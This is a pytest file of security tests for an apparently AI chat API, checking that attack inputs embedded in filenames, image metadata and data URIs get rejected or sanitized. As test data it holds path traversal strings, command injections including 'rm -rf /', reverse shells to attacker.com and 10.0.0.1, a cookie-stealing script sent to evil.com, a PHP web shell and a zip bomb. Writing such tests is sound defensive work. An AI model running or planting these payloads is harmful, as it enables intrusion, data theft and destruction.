# Section 7.3 - Multi-Modal Content Security Tests - Advanced Filename & Content Security  
# Based on: docs/test_design_n_planning/Testcases_7_3_Security Testing/Test Cases for Multi-Modal Content Security.md

import pytest
import httpx
import asyncio
import base64
import zipfile
import io
from typing import Dict, Any, List
from pathlib import Path

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from config import config, logger
from fixtures.auth_fixtures import AuthFixtures
from fixtures.multimodal_fixtures import MultiModalFixtures
from utils.security_validators import SecurityValidator

class TestAdvancedFilenameContentSecurity:
    """Advanced filename and content security tests covering detailed test cases"""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sec_mm_filename_001_path_traversal(self, http_client: httpx.AsyncClient,
                                                     auth_headers: Dict[str, str],
                                                     multimodal_fixtures: MultiModalFixtures,
                                                     make_request):
        """SEC_MM_FILENAME_001: Test path traversal attack prevention through malicious file names"""
        if not config.ENABLE_SECURITY_TESTS:
            pytest.skip("Security tests disabled")
        
        # Path traversal sequences from design document
        path_traversal_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../proc/self/environ",
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
            "file/../../../sensitive.txt",
            "..\\..\\..\\windows\\system.ini",
            "../../../../var/log/auth.log",
            "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",  # Double URL encoded
        ]
        
        for filename in path_traversal_filenames:
            image_data = multimodal_fixtures.create_test_image()
            image_base64 = base64.b64encode(image_data).decode('utf-8')
            
            request = {
                "model": config.get_chat_model(0),
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"Process file: {filename}"},
                            {
                                "type": "image_url",
                                "image_url": {"url": f"data:image/png;base64,{image_base64}"}
                            }
                        ]
                    }
                ],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request, track_cost=False
            )
            
            # Should reject or sanitize path traversal attempts
            if response.status_code == 200:
                response_text = str(response.json()).lower()
                # Verify no system access occurred
                assert "etc/passwd" not in response_text
                assert "system32" not in response_text
                assert "proc/self" not in response_text
            else:
                assert response.status_code in [400, 422], f"Path traversal should be rejected: {filename}"
            
            logger.info(f"SEC_MM_FILENAME_001: Path traversal attempt blocked: {filename[:30]}...")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sec_mm_filename_002_command_injection(self, http_client: httpx.AsyncClient,
                                                        auth_headers: Dict[str, str],
                                                        multimodal_fixtures: MultiModalFixtures,
                                                        make_request):
        """SEC_MM_FILENAME_002: Test command injection prevention through malicious file names"""
        if not config.ENABLE_SECURITY_TESTS:
            pytest.skip("Security tests disabled")
        
        # Command injection payloads from design document
        command_injection_filenames = [
            "$(whoami).pdf",
            "; rm -rf / #.txt",
            "| cat /etc/passwd > /tmp/exploit.txt",
            "file.pdf && curl attacker.com",
            "`id`.txt",
            "$(curl -X POST http://evil.com/data)",
            "'; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1 #.jpg",
            "file`nc -e /bin/sh attacker.com 4444`.png"
        ]
        
        for filename in command_injection_filenames:
            image_data = multimodal_fixtures.create_test_image()
            image_base64 = base64.b64encode(image_data).decode('utf-8')
            
            request = {
                "model": config.get_chat_model(0),
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"Process file: {filename}"},
                            {
                                "type": "image_url",
                                "image_url": {"url": f"data:image/png;base64,{image_base64}"}
                            }
                        ]
                    }
                ],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request, track_cost=False
            )
            
            # Should neutralize command injection attempts
            if response.status_code == 200:
                response_text = str(response.json()).lower()
                # Verify no command execution occurred
                assert "whoami" not in response_text
                assert "rm -rf" not in response_text
                assert "/bin/bash" not in response_text
                assert "curl" not in response_text
            else:
                assert response.status_code in [400, 422], f"Command injection should be rejected: {filename}"
            
            logger.info(f"SEC_MM_FILENAME_002: Command injection blocked: {filename[:30]}...")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sec_mm_filename_003_unicode_normalization(self, http_client: httpx.AsyncClient,
                                                           auth_headers: Dict[str, str],
                                                           multimodal_fixtures: MultiModalFixtures,
                                                           make_request):
        """SEC_MM_FILENAME_003: Test Unicode normalization attack prevention in file names"""
        if not config.ENABLE_SECURITY_TESTS:
            pytest.skip("Security tests disabled")
        
        # Unicode normalization attacks from design document
        unicode_attack_filenames = [
            "＼..＼..＼windows＼system32＼config＼sam",  # Fullwidth characters
            "..／..／..／etc／passwd",  # Alternative slash characters
            "file\u202e.gnp.exe",  # Right-to-left override
            "file\u0000.txt",  # Null character
            "file\u2044sensitive.txt",  # Fraction slash
            "file\u2215system.txt",  # Division slash
            "file\ufe68.txt",  # Small reverse solidus
            "..‥/etc/passwd",  # Two dot leader (lookalike)
        ]
        
        for filename in unicode_attack_filenames:
            image_data = multimodal_fixtures.create_test_image()
            image_base64 = base64.b64encode(image_data).decode('utf-8')
            
            request = {
                "model": config.get_chat_model(0),
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"Process file: {filename}"},
                            {
                                "type": "image_url",
                                "image_url": {"url": f"data:image/png;base64,{image_base64}"}
                            }
                        ]
                    }
                ],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request, track_cost=False
            )
            
            # Should handle Unicode normalization safely
            if response.status_code == 200:
                response_text = str(response.json()).lower()
                # Verify Unicode attacks don't bypass security
                assert "etc/passwd" not in response_text
                assert "system32" not in response_text
                assert ".exe" not in response_text.replace(filename.lower(), "")
            else:
                assert response.status_code in [400, 422], f"Unicode attack should be handled: {filename}"
            
            logger.info(f"SEC_MM_FILENAME_003: Unicode normalization attack handled: {repr(filename[:30])}")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sec_mm_content_001_malicious_embedded_content(self, http_client: httpx.AsyncClient,
                                                               auth_headers: Dict[str, str],
                                                               multimodal_fixtures: MultiModalFixtures,
                                                               make_request):
        """SEC_MM_CONTENT_001: Test malicious embedded content detection in file uploads"""
        if not config.ENABLE_SECURITY_TESTS:
            pytest.skip("Security tests disabled")
        
        # Malicious embedded content scenarios
        embedded_content_scenarios = [
            {
                "content": b"<script>window.location='http://evil.com/steal?data='+document.cookie</script>",
                "description": "JavaScript in metadata"
            },
            {
                "content": b"<?php system($_GET['cmd']); eval($_POST['code']); ?>",
                "description": "PHP code in metadata"
            },
            {
                "content": b"' OR 1=1; DROP TABLE users; --",
                "description": "SQL injection in metadata"
            },
            {
                "content": b"\x00HIDDEN_STEGANOGRAPHIC_DATA\x00",
                "description": "Hidden binary data"
            },
            {
                "content": b"javascript:alert('XSS')",
                "description": "JavaScript URI scheme"
            }
        ]
        
        for scenario in embedded_content_scenarios:
            # Create image with malicious metadata
            malicious_image = multimodal_fixtures.create_test_image_with_metadata(scenario["content"])
            image_base64 = base64.b64encode(malicious_image).decode('utf-8')
            
            request = {
                "model": config.get_chat_model(0),
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"Analyze image with {scenario['description']}"},
                            {
                                "type": "image_url",
                                "image_url": {"url": f"data:image/png;base64,{image_base64}"}
                            }
                        ]
                    }
                ],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request, track_cost=False
            )
            
            # Should detect and neutralize malicious content
            if response.status_code == 200:
                response_text = str(response.json()).lower()
                # Verify malicious content is not reflected or executed
                assert "<script>" not in response_text
                assert "<?php" not in response_text
                assert "drop table" not in response_text
                assert "javascript:" not in response_text
            else:
                assert response.status_code in [400, 422], f"Malicious content should be detected: {scenario['description']}"
            
            logger.info(f"SEC_MM_CONTENT_001: Malicious embedded content handled: {scenario['description']}")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sec_mm_content_002_zip_bomb_decompression(self, http_client: httpx.AsyncClient,
                                                           auth_headers: Dict[str, str],
                                                           multimodal_fixtures: MultiModalFixtures,
                                                           make_request):
        """SEC_MM_CONTENT_002: Test zip bomb and decompression attack prevention"""
        if not config.ENABLE_SECURITY_TESTS:
            pytest.skip("Security tests disabled")
        
        # Create various decompression bomb scenarios
        decompression_attacks = [
            {
                "type": "zip_bomb",
                "description": "Classic zip bomb"
            },
            {
                "type": "nested_zip",
                "description": "Nested zip archives"
            },
            {
                "type": "large_base64",
                "description": "Extremely large Base64 content"
            }
        ]
        
        for attack in decompression_attacks:
            if attack["type"] == "zip_bomb":
                # Create a zip bomb
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
                    # Create highly compressible content
                    large_content = b"0" * (5 * 1024 * 1024)  # 5MB of zeros
                    zf.writestr("bomb.txt", large_content)
                
                attack_data = zip_buffer.getvalue()
                data_uri = f"data:application/zip;base64,{base64.b64encode(attack_data).decode()}"
                
            elif attack["type"] == "nested_zip":
                # Create nested zip structure
                inner_zip = io.BytesIO()
                with zipfile.ZipFile(inner_zip, 'w', zipfile.ZIP_DEFLATED) as inner:
                    inner.writestr("inner.txt", b"A" * (1024 * 1024))
                
                outer_zip = io.BytesIO()
                with zipfile.ZipFile(outer_zip, 'w', zipfile.ZIP_DEFLATED) as outer:
                    outer.writestr("inner.zip", inner_zip.getvalue())
                
                attack_data = outer_zip.getvalue()
                data_uri = f"data:application/zip;base64,{base64.b64encode(attack_data).decode()}"
                
            else:  # large_base64
                # Very large Base64 payload (but limited for testing)
                large_content = b"X" * (2 * 1024 * 1024)  # 2MB
                data_uri = f"data:text/plain;base64,{base64.b64encode(large_content).decode()}"
            
            request = {
                "model": config.get_chat_model(0),
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"Process {attack['description']}"},
                            {
                                "type": "image_url",
                                "image_url": {"url": data_uri}
                            }
                        ]
                    }
                ],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request, track_cost=False
            )
            
            # Should prevent resource exhaustion
            if response.status_code == 200:
                logger.warning(f"Decompression attack was processed: {attack['description']}")
                # Verify system stability
                response_data = response.json()
                assert "choices" in response_data
            else:
                # Rejection is preferred for decompression attacks
                assert response.status_code in [400, 413, 422], f"Decompression attack should be prevented: {attack['description']}"
            
            logger.info(f"SEC_MM_CONTENT_002: Decompression attack handled: {attack['description']}")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sec_mm_content_003_mime_type_spoofing(self, http_client: httpx.AsyncClient,
                                                       auth_headers: Dict[str, str],
                                                       multimodal_fixtures: MultiModalFixtures,
                                                       make_request):
        """SEC_MM_CONTENT_003: Test MIME type spoofing detection and prevention"""
        if not config.ENABLE_SECURITY_TESTS:
            pytest.skip("Security tests disabled")
        
        # Advanced MIME type spoofing scenarios
        spoofing_scenarios = [
            {
                "declared_mime": "image/png",
                "actual_content": b"\x89PNG\r\n\x1a\n<script>alert('PNG with JS')</script>",
                "description": "PNG with embedded JavaScript"
            },
            {
                "declared_mime": "image/jpeg",
                "actual_content": b"\xff\xd8\xff\xe0<?php echo 'Infected JPEG'; ?>",
                "description": "JPEG with PHP code"
            },
            {
                "declared_mime": "text/plain",
                "actual_content": b"\x7fELF\x02\x01\x01\x00",  # ELF binary header
                "description": "Binary executable disguised as text"
            },
            {
                "declared_mime": "image/gif",
                "actual_content": b"GIF89a<iframe src='javascript:alert(1)'></iframe>",
                "description": "GIF with HTML injection"
            },
            {
                "declared_mime": "application/pdf",
                "actual_content": b"%PDF-1.4\n/JavaScript <script>alert('PDF XSS')</script>",
                "description": "PDF with JavaScript payload"
            }
        ]
        
        for scenario in spoofing_scenarios:
            spoofed_base64 = base64.b64encode(scenario["actual_content"]).decode('utf-8')
            data_uri = f"data:{scenario['declared_mime']};base64,{spoofed_base64}"
            
            request = {
                "model": config.get_chat_model(0),
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"Validate {scenario['description']}"},
                            {
                                "type": "image_url",
                                "image_url": {"url": data_uri}
                            }
                        ]
                    }
                ],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request, track_cost=False
            )
            
            # Should detect MIME type mismatches
            if response.status_code == 200:
                response_text = str(response.json()).lower()
                # Verify spoofed content is not processed
                assert "<script>" not in response_text
                assert "<?php" not in response_text
                assert "alert(" not in response_text
                assert "<iframe>" not in response_text
            else:
                assert response.status_code in [400, 422], f"MIME spoofing should be detected: {scenario['description']}"
            
            logger.info(f"SEC_MM_CONTENT_003: MIME spoofing handled: {scenario['description']}")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sec_mm_encoding_001_base64_security(self, http_client: httpx.AsyncClient,
                                                      auth_headers: Dict[str, str],
                                                      multimodal_fixtures: MultiModalFixtures,
                                                      make_request):
        """SEC_MM_ENCODING_001: Test Base64 decoding security and validation"""
        if not config.ENABLE_SECURITY_TESTS:
            pytest.skip("Security tests disabled")
        
        # Base64 security attack scenarios
        base64_attacks = [
            {
                "name": "Invalid padding",
                "payload": "SGVsbG8gV29ybGQ====invalid====",
                "description": "Malformed Base64 with extra padding"
            },
            {
                "name": "Buffer overflow attempt",
                "payload": base64.b64encode(b"\x90" * 1000 + b"\x41" * 1000).decode(),
                "description": "Potential buffer overflow payload"
            },
            {
                "name": "Nested encoding",
                "payload": base64.b64encode(base64.b64encode(b"nested payload")).decode(),
                "description": "Base64 within Base64"
            },
            {
                "name": "Null byte injection",
                "payload": base64.b64encode(b"test\x00\x00\x00malicious\x00").decode(),
                "description": "Embedded null bytes"
            },
            {
                "name": "Control characters",
                "payload": base64.b64encode(b"test\x01\x02\x03\x04\x05").decode(),
                "description": "Binary control characters"
            }
        ]
        
        for attack in base64_attacks:
            data_uri = f"data:image/png;base64,{attack['payload']}"
            
            request = {
                "model": config.get_chat_model(0),
                "messages": [
                    {
                        "role": "user",
                        "content": [
                            {"type": "text", "text": f"Test {attack['description']}"},
                            {
                                "type": "image_url",
                                "image_url": {"url": data_uri}
                            }
                        ]
                    }
                ],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request, track_cost=False
            )
            
            # Should handle malicious Base64 safely
            if response.status_code == 200:
                response_data = response.json()
                assert "choices" in response_data
                logger.warning(f"Base64 attack was processed: {attack['name']}")
            else:
                assert response.status_code in [400, 422], f"Malicious Base64 should be rejected: {attack['name']}"
            
            logger.info(f"SEC_MM_ENCODING_001: Base64 attack handled: {attack['name']}")